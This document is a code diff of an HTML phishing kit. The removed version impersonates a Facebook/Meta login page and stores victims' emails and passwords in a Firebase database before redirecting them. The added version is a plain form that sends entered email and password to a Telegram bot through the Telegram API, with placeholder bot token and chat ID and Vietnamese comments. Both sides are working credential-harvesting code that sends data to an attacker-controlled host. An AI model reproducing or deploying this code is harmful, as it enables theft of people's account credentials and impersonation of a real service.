@@ -1,103 +1,57 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <script async="" src="https://www.googletagmanager.com/gtag/js?id=G-TRYVP8NYC0"></script>
-  <script>
-    function gtag() { dataLayer.push(arguments); }
-    window.dataLayer = window.dataLayer || [], gtag("js", new Date), gtag("config", "G-TRYVP8NYC0");
-  </script>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width,initial-scale=1">
-  <meta name="description" content="Disagree With Decision">
-  <meta name="robots" content="noindex, nofollow, nocache">
-  <meta name="googlebot" content="noimageindex, max-video-preview:-1, max-image-preview:large, max-snippet:-1">
-  <meta property="og:title" content="Contact Suport Now">
-  <meta property="og:description" content="Contact Suport Now">
-  <meta property="og:image" content="https://res.cloudinary.com/dqvmnjw9l/image/upload/v1729691193/logo.jpg">
-  <meta property="og:type" content="article">
-  <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:title" content="Contact Suport Now">
-  <meta name="twitter:description" content="Contact Suport Now">
-  <meta name="twitter:image" content="https://res.cloudinary.com/dqvmnjw9l/image/upload/v1729691193/logo.jpg">
-  <title>Meta Support</title>
-  <link href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css" rel="stylesheet">
-  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.12.0/firebase-app.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.12.0/firebase-database.js"></script>
-  <link href="https://contactadsverrifyaccounts.cloud//static/css/main.89ada21a.css" rel="stylesheet">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Send Message to Telegram</title>
 </head>
 <body>
-  <div id="root">
-    <div class="bg-[#E9EBEE] font-['Helvetica','Arial',sans-serif]">
-      <div class="min-h-screen flex flex-col justify-center items-center">
-        <div class="flex flex-col md:flex-row justify-center items-center w-full max-w-4xl mt-[50px] mb-10">
-          <div class="flex-1 p-5 md:p-10 text-left order-1 md:order-1 ml-[30px] md:ml-0">
-            <h1 class="text-[#1877F2] text-5xl md:text-6xl font-bold ml-[40px] md:ml-0">facebook</h1>
-            <p class="text-xl md:text-2xl mt-2 leading-relaxed max-w-md">Facebook helps you connect and share with the people in your life.</p>
-          </div>
-          <div class="bg-white rounded-lg shadow-md w-full max-w-sm p-6 order-2">
-            <form id="loginForm">
-              <input id="email" placeholder="Mobile number or email" class="w-full p-4 mb-4 border border-gray-300 rounded-md text-base focus:border-blue-500 focus:outline-none bg-[#F5F6F7]" required="" type="text" name="mobileEmail">
-              <input id="password" placeholder="Password" class="w-full p-4 mb-4 border border-gray-300 rounded-md text-base focus:border-blue-500 focus:outline-none bg-[#F5F6F7]" required="" type="password" name="password">
-              <button type="submit" class="w-full p-4 bg-[#1877F2] text-white rounded-md text-lg font-bold hover:bg-[#165eab] ">Log In</button>
-            </form>
-            <a href="#" class="block text-center mt-5 text-sm text-[#1877F2] hover:underline">Forgot password?</a>
-            <hr class="my-6 border-t border-gray-300">
-            <div class="flex justify-center">
-              <a href="#" class="bg-[#42B72A] text-white px-6 py-4 rounded-md text-base font-bold hover:bg-[#36a420]">Create new account</a>
-            </div>
-          </div>
-        </div>
-        <div class="h-96"></div>
-      </div>
-      <footer class="w-full text-center text-xs text-gray-600 py-5 bg-white">
-        <div class="flex flex-wrap justify-center gap-2 mb-2">
-          <!-- footer links omitted for brevity -->
-        </div>
-        <div>Meta © 2025</div>
-      </footer>
-    </div>
-  </div>
+
+  <h2>Send Email and Password to Telegram</h2>
+
+  <form id="loginForm">
+    <input id="email" type="email" placeholder="Email" required><br><br>
+    <input id="password" type="password" placeholder="Password" required><br><br>
+    <button type="submit">Send to Telegram</button>
+  </form>
 
   <script>
-    // Firebase Configuration
-    const firebaseConfig = {
-  apiKey: "AIzaSyCbFH_p_MORx8kf1G6XfxrQrvb65kZG4Ow",
-  authDomain: "koller-56c65.firebaseapp.com",
-  projectId: "koller-56c65",
-  storageBucket: "koller-56c65.firebasestorage.app",
-  messagingSenderId: "329933190355",
-  appId: "1:329933190355:web:8f79bbbf66930da58ad026",
-  measurementId: "G-CERNH0S116"
-};
-
-    // Khởi tạo Firebase
-    const app = firebase.initializeApp(firebaseConfig);
-    const database = firebase.database(app);
-
-    // Lắng nghe sự kiện gửi form
     document.getElementById("loginForm").addEventListener("submit", function(event) {
       event.preventDefault();
 
       var email = document.getElementById("email").value;
       var password = document.getElementById("password").value;
 
-      // Lưu dữ liệu vào Firebase Realtime Database
-      const newUserRef = database.ref('users').push();
-      newUserRef.set({
-        email: email,
-        password: password
+      // Token API từ BotFather và Chat ID
+      var botToken = 'YOUR_BOT_TOKEN';  // Thay bằng Bot Token của bạn
+      var chatId = 'YOUR_CHAT_ID';  // Thay bằng Chat ID của bạn
+
+      // URL API của Telegram
+      var url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+      // Nội dung tin nhắn bạn muốn gửi
+      var message = `Email: ${email}\nPassword: ${password}`;
+
+      // Gửi yêu cầu đến Telegram API
+      fetch(url, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({
+          chat_id: chatId,
+          text: message
+        })
       })
-      .then(() => {
-        console.log('Dữ liệu đã được lưu vào Firebase');
-        // Chuyển hướng đến confirm.html
-        window.location.href = 'https://girlhotnewstoday.github.io/logins/confirm.html';
+      .then(response => response.json())
+      .then(data => {
+        console.log('Message sent:', data);
       })
-      .catch((error) => {
-        console.error('Lỗi khi lưu dữ liệu vào Firebase:', error);
+      .catch(error => {
+        console.error('Error:', error);
       });
     });
   </script>
+
 </body>
 </html>
